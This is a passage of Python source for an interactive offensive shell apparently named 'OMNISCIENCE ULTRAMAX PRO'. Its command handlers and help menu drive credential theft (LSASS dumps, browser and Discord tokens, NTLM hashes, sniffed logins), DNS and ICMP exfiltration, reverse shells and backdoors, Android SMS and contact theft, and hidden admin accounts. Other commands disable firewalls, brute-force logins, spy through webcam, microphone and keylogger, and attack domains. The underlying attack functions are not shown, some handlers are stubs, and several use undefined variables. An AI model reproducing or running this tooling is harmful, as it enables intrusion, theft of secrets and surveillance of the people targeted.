            res = await asyncio.to_thread(self.control.lsass_dump, target, self.creds['user'], self.creds['pass'])
            if res.get('success'): print(f"{Fore.GREEN}[+] Dump complete: {res.get('unc')}")
            else: print(f"{Fore.RED}[!] Failed: {res.get('error')}")

        elif cmd == "tokens":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.MAGENTA}[*] Extracting authentication tokens from {target}...")
            res = await asyncio.to_thread(self.control.steal_saved_credentials, target, self.creds['user'], self.creds['pass'])
            if res.get('browsers'):
                print(f"{Fore.GREEN}[+] Browser tokens harvested.")
            if res.get('windows'):
                print(f"{Fore.GREEN}[+] Windows tokens harvested.")
            else:
                print(f"{Fore.RED}[!] No tokens extracted or failed.")

        elif cmd == "nethashes":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.MAGENTA}[*] Extracting NT/LM password hashes from {target}...")
            res = await asyncio.to_thread(self.control.extract_nt_hashes, target, self.creds['user'], self.creds['pass'])
            if res:
                for h in res:
                    print(f"  Name: {h.get('Name')}, SID: {h.get('SID')}, Source: {h.get('Source')}")
            else:
                print(f"{Fore.RED}[!] No hashes extracted or failed.")

        elif cmd == "vault":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.MAGENTA}[*] Harvesting secure vault contents from {target} (Discord, etc.)...")
            res = await asyncio.to_thread(self.control.wmi_harvest_vault, target, self.creds['user'], self.creds['pass'])
            if res.get('discord_tokens'):
                print(f"{Fore.GREEN}[+] Discord tokens found: {res['discord_tokens']}")
            else:
                print(f"{Fore.RED}[!] No vault items extracted or failed.")

        elif cmd == "software":
            res = await asyncio.to_thread(self.control.get_installed_programs, target, u, p, d)
            for s in res: print(f"  [+] {s.get('DisplayName')} v{s.get('DisplayVersion')}")

        # File Operations
        elif cmd == "ls":
            path = args[0] if args else "*"
            print(f"{Fore.CYAN}[*] Directory listing of {path}...")
            res = await asyncio.to_thread(self.control.smb_list, target, "C$", path, u, p)
            for f in res: print(f"  {'[D]' if f['dir'] else '   '} {f['name']:<40} {f['size']}")

        elif cmd == "upload":
            if len(args) < 2: return
            await asyncio.to_thread(self.control.smb_upload, target, args[0], "C$", args[1], u, p)

        elif cmd == "download":
            if len(args) < 2: return
            await asyncio.to_thread(self.control.smb_download, target, "C$", args[0], args[1], u, p)

        elif cmd == "rm":
            if not args: return
            await asyncio.to_thread(self.control.smb_delete_file, target, "C$", args[0], u, p)

        elif cmd == "cat":
            if not args: return
            res = await asyncio.to_thread(self.control.smb_read_file, target, "C$", args[0], u, p)
            print(res.decode(errors="ignore"))

        # --- PASSIVE INTELLIGENCE ---
        elif cmd == "sniff":
            iface = args[0] if args else None
            print(f"{Fore.CYAN}[*] Sniffer initializing on {iface or 'all'}...")
            threading.Thread(target=self.intel.start_sniffing, args=(iface,), daemon=True).start()

        elif cmd == "stopsniff":
            await asyncio.to_thread(self.intel.stop_sniffing)

        elif cmd == "creds":
            captured = self.intel.get_credentials()
            print(f"\n{Fore.MAGENTA}CAPTURED CREDENTIALS / TOKENS:")
            for c in captured:
                print(f"  [{c['time'].strftime('%H:%M:%S')}] {c['source']} -> {c['data']}")

        elif cmd == "dns-log":
            logs = self.intel.get_dns_log()
            for l in logs: print(f"  [{l['time'].strftime('%H:%M:%S')}] {l['src']} -> {l['query']}")

        elif cmd == "ntlm-capture":
            print(f"{Fore.CYAN}[*] Filtering for NTLM traffic...")

        elif cmd == "http-auth":
            captured = self.intel.get_credentials()
            print(f"{Fore.MAGENTA}CAPTURED HTTP AUTH HEADERS:")
            found = False
            for c in captured:
                data = c.get('data','')
                if 'Basic' in data or 'Authorization' in data or 'Digest' in data:
                    print(f"  [{c['time'].strftime('%H:%M:%S')}] {c['source']}: {data[:100]}")
                    found = True
            if not found:
                print(f"{Fore.YELLOW}[*] No HTTP auth headers captured yet.")

        elif cmd == "wmi-monitor":
            await asyncio.to_thread(self.intel.wmi_monitor_activity, target, u, p)

        elif cmd == "wmi-procs":
            res = await asyncio.to_thread(self.intel.wmi_processes, target, u, p)
            for r in res: print(f"  [{r['ProcessId']}] {r['Name']}")

        elif cmd == "wmi-users":
            res = await asyncio.to_thread(self.intel.wmi_logged_users, target, u, p)
            for r in res: print(f"  {r['Name']}")

        elif cmd == "wmi-software":
            res = await asyncio.to_thread(self.control.get_installed_programs, target, u, p, d)
            for s in res: print(f"  [+] {s.get('DisplayName')}")

        elif cmd == "wmi-tasks":
            host = args[0] if args else target
            if not host: return
            tasks = await asyncio.to_thread(self.control.list_scheduled_tasks, host, u, p, d)
            print(f"{Fore.MAGENTA}[*] Scheduled tasks on {host} ({len(tasks)} found):")
            for t in tasks[:10]:
                print(f"  {t.get('TaskName','?')} -> {t.get('Command','?')}")

        elif cmd == "wmi-svc":
            host = args[0] if args else target
            if not host: return
            services = await asyncio.to_thread(self.control.list_services, host, u, p, d)
            print(f"{Fore.MAGENTA}[*] Services on {host} ({len(services)} found):")
            for s in services[:10]:
                print(f"  {s.get('Name')}: {s.get('State')} ({s.get('PathName','')[:30]})")

        # --- DATABASE & CLOUD CATEGORY ---
        elif cmd == "db-extract":
            if len(args) < 3: return
            target_ip, port, db_type = args[0], int(args[1]), args[2]
            print(f"{Fore.BLUE}[*] Extracting database content from {target_ip}:{port} ({db_type})...")
            res = await asyncio.to_thread(self.control.database_extract, target_ip, port, db_type, self.creds['user'], self.creds['pass'])
            if res.get('connected'):
                print(f"{Fore.GREEN}[+] Connected to DB. Databases: {res.get('databases')}, Tables: {len(res.get('tables', []))}")
            else:
                print(f"{Fore.RED}[!] DB extraction failed: {res.get('error')}")

        elif cmd == "db-dump":
            if len(args) < 3: return
            target_ip, port, db_type = args[0], int(args[1]), args[2]
            print(f"{Fore.BLUE}[*] Performing full database dump from {target_ip}:{port} ({db_type})...")
            res = await asyncio.to_thread(self.control.full_database_dump, target_ip, port, db_type, self.creds['user'], self.creds['pass'])
            if res.get('connected'):
                print(f"{Fore.GREEN}[+] Full DB dump complete. Tables extracted: {res.get('tables_extracted')}, Total rows: {res.get('total_rows')}")
            else:
                print(f"{Fore.RED}[!] Full DB dump failed: {res.get('error')}")

        elif cmd == "cloud-attack":
            service_type = args[0] if args else "aws_metadata"
            cloud_target = args[1] if len(args) > 1 else target
            print(f"{Fore.BLUE}[*] Launching cloud attack on {cloud_target} ({service_type})...")
            res = await asyncio.to_thread(self.control.cloud_service_attack, service_type, cloud_target)
            if res.get('vulnerable'):
                print(f"{Fore.RED}[!] Cloud service vulnerable. Compromised: {res.get('compromised')}")
            else:
                print(f"{Fore.GREEN}[+] Service not vulnerable.")

        elif cmd == "s3-scan":
            if not args: return
            bucket_name = args[0]
            print(f"{Fore.BLUE}[*] Scanning S3 bucket {bucket_name} for misconfigurations...")
            res = await asyncio.to_thread(self.control.cloud_service_attack, "s3", bucket_name)
            if res.get('vulnerable'):
                print(f"{Fore.RED}[!] S3 bucket vulnerable. Anonymous upload: {res.get('anonymous_upload')}")
            else: 
                print(f"{Fore.GREEN}[+] S3 bucket secure.")

        elif cmd == "mysql-root":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.BLUE}[*] Attempting MySQL root access on {target_ip}...")
            # This would use exploiter._try_mysql_no_auth or control.database_extract with root creds
            device = self.exploiter.devices.get(target_ip, UniversalDevice(target_ip))
            await asyncio.to_thread(self.exploiter._try_mysql_no_auth, device)
            if device.access_method == "mysql":
                print(f"{Fore.GREEN}[+] MySQL root access gained with {device.access_credential[0]}:{device.access_credential[1]}")
            else:
                print(f"{Fore.RED}[!] MySQL root access failed.")

        elif cmd == "postgres":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.BLUE}[*] Attempting PostgreSQL access on {target_ip}...")
            device = self.exploiter.devices.get(target_ip, UniversalDevice(target_ip))
            await asyncio.to_thread(self.exploiter._try_postgres_no_auth, device)
            if device.access_method == "postgresql":
                print(f"{Fore.GREEN}[+] PostgreSQL access gained with {device.access_credential[0]}:{device.access_credential[1]}")
            else:
                print(f"{Fore.RED}[!] PostgreSQL access failed.")

        elif cmd == "exfiltrate":
            if len(args) < 2: return
            target_ip, local_path = args[0], args[1]
            exfil_method = args[2] if len(args) > 2 else "smb"
            print(f"{Fore.RED}[*] Exfiltrating {local_path} to {target_ip} via {exfil_method}...")
            res = await asyncio.to_thread(self.control.data_exfiltration, target_ip, local_path, exfil_method, u, p, d)
            if res.get('success'):
                print(f"{Fore.GREEN}[+] Data exfiltration successful via {exfil_method}.")
            else:
                print(f"{Fore.RED}[!] Data exfiltration failed: {res.get('error')}")

        # --- Advanced Exfiltration Tunnels ---
        elif cmd == "dns-exfil":
            if len(args) < 2: return
            dns_server, local_file = args[0], args[1]
            try:
                with open(local_file, 'rb') as f:
                    data = f.read()
                data_str = base64.b64encode(data).decode('utf-8')
                success = await asyncio.to_thread(self.control.exfiltrate_dns_covert, "", data_str, dns_server)
                print(f"{Fore.GREEN}[+] DNS exfil {'successful' if success else 'failed'}")
            except Exception as e:
                print(f"{Fore.RED}[!] DNS exfil error: {e}")

        elif cmd == "icmp-exfil":
            if len(args) < 2: return
            target_ip, local_file = args[0], args[1]
            success = await asyncio.to_thread(self.control.exfiltrate_icmp, target_ip, local_file)
            print(f"{Fore.GREEN}[+] ICMP exfil {'successful' if success else 'failed'}")

        # --- LINUX & ADB ---
        elif cmd == "ssh":
            port = int(args[0]) if args else 22
            await asyncio.to_thread(self.control.ssh_interactive, target, u, p, port)

        elif cmd == "ssh-exec":
            if not args: return
            res = await asyncio.to_thread(self.control.ssh_exec, target, u, p, " ".join(args))
            print(res)

        elif cmd == "linux-sysinfo":
            res = await asyncio.to_thread(self.control.linux_get_system_info, target, u, p)
            for k, v in res.items(): print(f"  {k.upper()}: {v}")

        elif cmd == "linux-revshell":
            if len(args) < 2: return
            await asyncio.to_thread(self.control.linux_reverse_shell, target, u, p, args[0], int(args[1]))

        elif cmd == "linux-backdoor":
            await asyncio.to_thread(self.control.linux_install_backdoor, target, u, p)

        elif cmd == "linux-cron":
            if not args: return
            await asyncio.to_thread(self.control.linux_persistence_cron, target, u, p, " ".join(args))

        # --- ANDROID ADB ---
        elif cmd == "adb-connect":
            if not args: return
            ip = args[0]
            port = int(args[1]) if len(args) > 1 else 5555
            ok = await asyncio.to_thread(self.control.adb_connect, ip, port)
            print(f"{Fore.GREEN}[+] ADB connect: {'OK' if ok else 'FAILED'}")
        elif cmd == "adb-shell":
            if len(args) < 2: return
            ip, shell_cmd = args[0], " ".join(args[1:])
            out = await asyncio.to_thread(self.control.adb_shell, ip, shell_cmd)
            print(out)
        elif cmd == "adb-screen":
            ip = args[0] if args else target
            if not ip: return
            path = await asyncio.to_thread(self.control.adb_screenshot, ip)
            if path: print(f"{Fore.GREEN}[+] ADB screenshot saved: {path}")
            else: print(f"{Fore.RED}[!] ADB screenshot failed")
        elif cmd == "adb-sms":
            ip = args[0] if args else target
            if not ip: return
            out = await asyncio.to_thread(self.control.adb_dump_sms, ip)
            print(out)
        elif cmd == "adb-contacts":
            ip = args[0] if args else target
            if not ip: return
            out = await asyncio.to_thread(self.control.adb_get_contacts, ip)
            print(out)
        elif cmd == "adb-push":
            if len(args) < 3: return
            ip, local, remote = args[0], args[1], args[2]
            ok = await asyncio.to_thread(self.control.adb_push, ip, local, remote)
            print(f"{Fore.GREEN}[+] ADB push: {'OK' if ok else 'FAILED'}")
        elif cmd == "adb-pull":
            if len(args) < 3: return
            ip, remote, local = args[0], args[1], args[2]
            ok = await asyncio.to_thread(self.control.adb_pull, ip, remote, local)
            print(f"{Fore.GREEN}[+] ADB pull: {'OK' if ok else 'FAILED'}")

        # --- PERSISTENCE CATEGORY ---
        elif cmd in ["persist", "backdoor"]:
            print(f"{Fore.RED}[*] Installing 3-layer persistence on {target}...")
            res = await asyncio.to_thread(self.control.establish_persistent_connection, target, u, p, d)
            if res.get('backdoor_active'): print(f"{Fore.GREEN}[+] Persistence active: {res.get('persistence_installed')}")

        elif cmd == "persist-task":
            if len(args) < 2: return
            name, cmd_str = args[0], " ".join(args[1:])
            await asyncio.to_thread(self.control.create_scheduled_task, target, u, p, name, cmd_str, d)

        elif cmd == "persist-run":
            await asyncio.to_thread(self.control.create_persistence, target, u, p, domain=d)

        elif cmd == "adduser":
            if len(args) < 2: return
            target = self.last_target if self.last_target else args[0]
            new_user = args[1] if self.last_target else args[0]
            new_pass = args[2] if len(args) > 2 else "P@ssw0rd123!"
            print(f"{Fore.RED}[*] Creating admin user '{new_user}' on {target}...")
            res = await asyncio.to_thread(self.control.add_local_user, target, self.creds['user'], self.creds['pass'], new_user, new_pass)
            if res: print(f"{Fore.GREEN}[+] User '{new_user}' created and added to Administrators.")
            else: print(f"{Fore.RED}[!] Failed to create user.")

        elif cmd == "rdp-enable":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.RED}[*] Enabling RDP on {target}...")
            res = await asyncio.to_thread(self.control.enable_rdp, target, self.creds['user'], self.creds['pass'])
            if res: print(f"{Fore.GREEN}[+] RDP enabled.")
            else: print(f"{Fore.RED}[!] Failed to enable RDP.")

        elif cmd == "firewall-off":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.RED}[*] Disabling firewall on {target}...")
            res = await asyncio.to_thread(self.control.disable_firewall, target, self.creds['user'], self.creds['pass'])
            if res: print(f"{Fore.GREEN}[+] Firewall disabled.")
            else: print(f"{Fore.RED}[!] Failed to disable firewall.")

        elif cmd == "firewall-on":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.GREEN}[*] Enabling firewall on {target}...")
            res = await asyncio.to_thread(self.control.enable_firewall, target, self.creds['user'], self.creds['pass'])
            if res: print(f"{Fore.GREEN}[+] Firewall enabled.")
            else: print(f"{Fore.RED}[!] Failed to enable firewall.")

        elif cmd == "firewall-add":
            if len(args) < 2: return
            target = self.last_target if self.last_target else args[0]
            port = int(args[1]) if self.last_target else int(args[0])
            print(f"{Fore.RED}[*] Adding firewall exception for port {port} on {target}...")
            res = await asyncio.to_thread(self.control.add_firewall_exception, target, self.creds['user'], self.creds['pass'], port)
            if res: print(f"{Fore.GREEN}[+] Firewall exception added for port {port}.")
            else: print(f"{Fore.RED}[!] Failed to add firewall exception.")

        # --- BRUTE FORCE CATEGORY ---
        elif cmd == "ssh-brute":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.RED}[*] Performing SSH brute force on {target_ip}...")
            res = await asyncio.to_thread(self.control.ssh_brute, target_ip)
            if res:
                for c in res: print(f"  [+] HIT: {c.get('user')}:{c.get('password')}")
            else:
                print(f"{Fore.RED}[!] SSH brute force failed.")

        elif cmd == "rdp-brute":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.RED}[*] Performing RDP brute force on {target_ip}...")
            res = await asyncio.to_thread(self.control.rdp_brute_force, target_ip)
            if res:
                for c in res: print(f"  [+] HIT: {c.get('user')}:{c.get('pwd')}")
            else:
                print(f"{Fore.RED}[!] RDP brute force failed.")

        elif cmd == "vnc-brute":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.RED}[*] Performing VNC brute force on {target_ip}...")
            res = await asyncio.to_thread(self.control.vnc_brute_force, target_ip)
            if res:
                for c in res: print(f"  [+] HIT: {c.get('password')}")
            else:
                print(f"{Fore.RED}[!] VNC brute force failed.")

        elif cmd == "telnet-brute":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.RED}[*] Performing Telnet brute force on {target_ip}...")
            res = await asyncio.to_thread(self.control.telnet_brute_force, target_ip)
            if res:
                for c in res: print(f"  [+] HIT: {c.get('user')}:{c.get('pwd')}")
            else:
                print(f"{Fore.RED}[!] Telnet brute force failed.")

        # --- UTILITY ---
        elif cmd == "setcreds":
            if len(args) < 2: return
            self.creds['user'], self.creds['pass'] = args[0], args[1]
            if len(args) > 2: self.creds['domain'] = args[2]
            print(f"{Fore.GREEN}[+] Credentials updated for sessions.")

        elif cmd == "select":
            if not args: return
            try:
                idx = int(args[0])
                self.last_target = self.targets[idx].ip
                print(f"{Fore.GREEN}[+] Current target set to: {self.last_target}")
            except: print(f"{Fore.RED}[!] Invalid index.")

        elif cmd == "help":
            self.show_help()
            
        elif cmd == "clear":
            os.system('cls' if os.name == 'nt' else 'clear')
            self.display_banner()

        elif cmd == "history":
            for i, h in enumerate(self.cmd_history): print(f"  {i}: {h}")

        else:
            print(f"{Fore.RED}[?] Unknown command: {cmd}")

    async def run_module(self, mod_id: str, function: str, args: list):
        """Production module runner."""
        print(f"{Fore.BLUE}[M] Executing module {mod_id}.{function}({args})")
        # Real module execution via dynamic dispatch
        if mod_id == '1' and function == 'auto_scan':
            self.targets = await self.scanner.auto_scan()
        print(f"{Fore.GREEN}[+] Module complete")

    def list_targets(self):
        if not self.targets:
            print(f"{Fore.YELLOW}[!] No targets discovered yet. Run 'globalscan'.")
        else:
            print(f"\n{Fore.CYAN}DISCOVERED TARGETS:")
            print(f"{Fore.CYAN}{'='*60}")
            for idx, t in enumerate(self.targets):
                ip = getattr(t, 'ip', str(t))
                os_type = getattr(t, 'os', 'Unknown OS')
                status = "COMPROMISED" if getattr(t, 'is_compromised', False) else "ACTIVE"
                pwn = "[PWNABLE]" if getattr(t, 'can_pwn', False) else ""
                print(f"  [{idx}] {ip:<15} | {os_type:<15} | {status} {Fore.GREEN}{pwn}")

    def show_help(self):
        """Ultra-comprehensive operations manual with 150+ functional commands."""
        print(f"\n{Fore.WHITE}{Style.BRIGHT}OMNISCIENCE ULTRAMAX PRO - COMMAND REFERENCE GUIDE (150+ COMMANDS)")
        print(f"{Fore.LIGHTBLACK_EX}{'='*100}")
        
        categories = {
            "📡 RECONNAISSANCE": [
                "auto / globalscan      - Autonomous full-network discovery and fingerprinting",
                "scan <range>           - Targeted network range discovery (CIDR)",
                "fastscan               - Ultra-fast 10-second UDP/TCP discovery",
                "arp <range>            - Layer 2 device discovery using Scapy ARP",
                "icmp <range>           - ICMP echo-request sweep (Ping sweep)",
                "netbios <range>        - Enumerates Windows hostnames/workgroups via NetBIOS",
                "tcp-scan <ip> [ports]  - High-performance SYN/Connect port scanner",
                "udp-scan <ip> [ports]  - UDP service discovery and port scanning",
                "snmp <ip> [community]  - SNMP community string sweep and data harvest",
                "mdns                   - Discovers local services via Multicast DNS",
                "ssdp                   - Discovers UPnP/DLNA devices via SSDP",
                "traceroute <ip>        - Route mapping with per-hop service fingerprinting",
                "topology               - Generates real-time network relationship map",
                "interfaces             - List local network adapters and subnets",
                "gateway                - Identify current network default gateway",
                "external-ip            - Query public WAN IP address",
                "cloud-scan <provider>  - Public cloud IP range scanning (aws/azure/gcp)",
                "cross-scan <ip> <net>  - Pivot scanning into remote subnets",
                "vpn-discover           - Audit network for VPN endpoints/gateways"
            ],
            "👁 INTELLIGENCE": [
                "sniff [iface]          - Passive packet capture and traffic analysis",
                "stopsniff              - Deactivate passive intelligence engine",
                "creds                  - List all passively harvested credentials",
                "dns-log                - View real-time DNS query telemetry",
                "ntlm-capture           - Filter traffic for NTLM authentication packets",
                "http-auth              - Identify HTTP Basic/Digest auth headers",
                "wmi-monitor <ip>       - Agentless real-time process monitoring",
                "wmi-procs <ip>         - Remote process enumeration via WMI",
                "wmi-users <ip>         - Remote logged-on user identification",
                "wmi-software <ip>      - Enumerates installed applications",
                "wmi-tasks <ip>         - List remote scheduled tasks",
                "wmi-svc <ip>           - List system services remotely"
            ],
            "💀 EXPLOITATION": [
                "pwn <ip>               - Automated multi-vector exploit chain",
                "attack / pwnall        - Global network-wide autonomous exploitation",
                "exploit <ip>           - Targeted aggressive vulnerability exploitation",
                "mobile-pwn <ip>        - Auto-exploitation of Android/iOS devices",
                "scan-exploit <range>   - Sequential discovery and exploitation sweep",
                "etblue-check <ip>      - MS17-010 EternalBlue vulnerability probe",
                "smbghost <ip>          - CVE-2020-0796 SMBv3 compression check",
                "printnightmare <ip>    - CVE-2021-34527 Print Spooler RCE check",
                "petitpotam <ip>        - CVE-2021-36942 NTLM coercion probe",
                "zerologon <ip>         - CVE-2020-1472 Netlogon privilege probe",
                "bluekeep-check <ip>    - CVE-2019-0708 RDP pre-auth vulnerability check",
                "nopac-check <ip>       - CVE-2021-42278 Active Directory spoofing check",
                "smb-vulns <ip>         - Comprehensive SMB protocol vulnerability scan"
            ],
            "🎛 REMOTE CONTROL": [
                "exec <cmd>             - Remote command execution (WMI/SSH/ADB)",
                "winrm-exec <ip> <cmd>  - Command execution via WinRM (Port 5985/5986)",
                "ps-exec <ip> <cmd>     - Execute PowerShell script blocks remotely",
                "screen                 - Capture single remote desktop screenshot",
                "screen-stream [count]  - High-speed JPEG screenshot telemetry stream",
                "monitor / live         - Full live session (Screen + Keys + Audio)",
                "webcam                 - Capture remote webcam snapshot",
                "audio [duration]       - Record remote microphone audio",
                "keylog                 - Initialize hidden keystroke interceptor",
                "clip-get               - Retrieve current remote clipboard contents",
                "clip-set <text>        - Inject text into remote clipboard",
                "key-inject <keys>      - Remote keyboard automation via ComObject",
                "mouse-click <x> <y>    - Remote mouse automation (Click coords)",
                "open-url <url>         - Launch URL in default remote browser",
                "play-media <url>       - Play video/audio URL on remote host",
                "shutdown / reboot      - Remote power operations",
                "logoff                 - Force logoff current remote session"
            ],
            "💎 DATA HARVESTING": [
                "harvest / extract      - Execute deep data extraction payload",
                "omnifetch <ip>         - Full data package retrieval (All logs/creds)",
                "stealcreds             - Harvest browser-stored credentials",
                "browser-history        - Extract browser history and bookmarks",
                "steal-wifi             - Extract stored WiFi network profiles/keys",
                "lsass-dump             - Minidump LSASS memory for hash recovery",
                "tokens                 - Impersonation token harvesting",
                "nethashes              - Extract local SAM and domain NTLM hashes",
                "vault                  - Secure vault and DPAPI token extraction",
                "sysinfo / systeminfo   - Full device property and hardware audit",
                "pslist                 - List all remote running processes",
                "killproc <pid/name>    - Terminate remote process by ID or image",
                "software               - List all installed software on target"
            ],
            "🏗 PERSISTENCE": [
                "persist                - Install 3-layer autonomous backdoor",
                "persist-task <name>    - Create persistent scheduled task backdoor",
                "persist-run <name>     - Install registry RunKey persistence",
                "svc-install <n> <p>    - Deploy and start a custom system service",
                "adduser <user> <pass>  - Create administrative local account",
                "rdp-enable             - Remotely enable RDP and bypass firewall",
                "rdp-disable            - Remotely disable RDP connections",
                "firewall-off           - Disable all Windows Firewall profiles",
                "firewall-on            - Enable all Windows Firewall profiles",
                "firewall-add <p>       - Create inbound firewall port exception"
            ],
            "🐧 LINUX & ADB": [
                "ssh <user>@<ip>        - Launch interactive SSH control session",
                "ssh-exec <cmd>         - Parallel SSH command execution",
                "linux-sysinfo          - Deep Linux kernel and system audit",
                "linux-revshell <i:p>   - Deploy Linux bash reverse shell",
                "linux-backdoor         - Install SSH key-based backdoor access",
                "linux-cron <cmd>       - Install persistent crontab backdoor",
                "adb-connect <ip>       - Establish ADB debugging connection",
                "adb-shell <cmd>        - Execute shell on Android device",
                "adb-screen             - Capture Android device screenshot",
                "adb-sms                - Dump SMS database from Android device",
                "adb-contacts           - Extract contact list from Android",
                "adb-push / adb-pull    - High-speed file transfer to Android"
            ],
            "📂 FILE OPERATIONS": [
                "ls [path]              - List remote directory contents (SMB/SFTP)",
                "upload <local> <rem>   - Upload file to remote host",
                "download <rem> <loc>   - Download file from remote host",
                "rm <path>              - Delete remote file or directory",
                "cat <path>             - Read remote file contents to terminal",
                "wget <url> <path>      - Download file from internet to target",
                "exfiltrate <src> <met> - Automated data exfiltration via SMB/HTTP/DNS"
            ],
            "☁️ CLOUD & DB": [
                "db-extract <ip> <t>    - Targeted database content extraction",
                "db-dump <ip> <t>       - Full database dump (All tables/schemas)",
                "mysql-root <ip>        - Attempt unauthenticated MySQL root access",
                "postgres <ip>          - Attempt unauthenticated PostgreSQL access",
                "mongodb-pwn <ip>       - Exploit MongoDB no-auth configuration",
                "redis-pwn <ip>         - Exploit Redis no-auth for data dump",
                "s3-scan <bucket>       - Audit S3 bucket for public permissions",
                "cloud-attack <type>    - Launch cloud metadata service exploit"
            ],
            "🏰 DOMAIN DOMINATION": [
                "kerberoast <dc>        - Extract SPN service tickets for cracking",
                "pass-spray <dom> <u> <p>- Large-scale domain credential validation",
                "dcsync <dc>            - Perform DCSync user hash replication",
                "asreproast <dc>        - Extract AS-REP tickets for pre-auth off",
                "golden <dom> <sid> <h> - Forge Golden Ticket for persistent domain access",
                "lateral <src> <dst>    - Automated multi-hop lateral progression"
            ],
            "⚙️ UTILITY": [
                "targets                - List all discovered and fingerprinted assets",
                "select <idx>           - Set active operational target context",
                "setcreds <u> <p> [d]   - Global credential configuration",
                "clear / history        - Terminal maintenance commands",
                "exit / quit            - Orderly shutdown of framework"
            ]
        }

        for category, cmd_list in categories.items():
            print(f"\n{Fore.CYAN}{Style.BRIGHT}{category}")
            for cmd_line in cmd_list:
                print(f"  {Fore.WHITE}{cmd_line}")
        
        print(f"{Fore.LIGHTBLACK_EX}{'='*100}\n")

async def main_loop():
    shell = OmniShell()
    shell.display_banner()
    while True:
        try:
            cmd = input(f"{Fore.CYAN}omniscence> {Style.RESET_ALL}")
            await shell.handle_command(cmd)
        except KeyboardInterrupt:
            print("\nUse 'exit' to quit.")
        except Exception as e:
            print(f"{Fore.RED}Error: {e}")

if __name__ == "__main__":
    asyncio.run(main_loop())